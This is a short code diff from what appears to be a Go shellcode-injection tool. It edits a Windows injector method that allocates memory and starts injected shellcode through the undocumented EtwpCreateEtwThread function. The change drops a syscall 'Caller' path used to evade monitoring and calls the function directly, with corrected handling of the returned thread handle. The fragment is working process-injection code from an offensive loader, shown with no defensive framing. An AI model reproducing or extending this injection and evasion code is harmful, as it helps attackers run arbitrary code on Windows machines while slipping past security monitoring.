@@ -487,15 +487,13 @@ func (w *windowsSyscallInjector) injectEtwpCreateEtwThread(shellcode []byte) err
 		return fmt.Errorf("memory allocation failed: %w", err)
 	}
 
-	// Route EtwpCreateEtwThread through the Caller if it supports the function,
-	// otherwise fall back to the api proc. EtwpCreateEtwThread is not an Nt*
-	// syscall so most Callers will not resolve an SSN for it — the Call will
-	// return a non-zero NTSTATUS and we fall back.
-	r, _ := w.caller.Call("EtwpCreateEtwThread", addr, 0)
+	// EtwpCreateEtwThread returns HANDLE (not NTSTATUS) — non-zero = success.
+	// Cannot route through Caller (which treats non-zero as NTSTATUS error).
+	// Always use the direct proc call.
+	r, _, _ := api.ProcEtwpCreateEtwThread.Call(addr, 0)
 	if r == 0 {
-		return fmt.Errorf("EtwpCreateEtwThread via Caller failed")
+		return fmt.Errorf("thread creation failed")
 	}
-	// Caller returns the thread handle as r (non-zero = success for this API).
 	return nil
 }
 
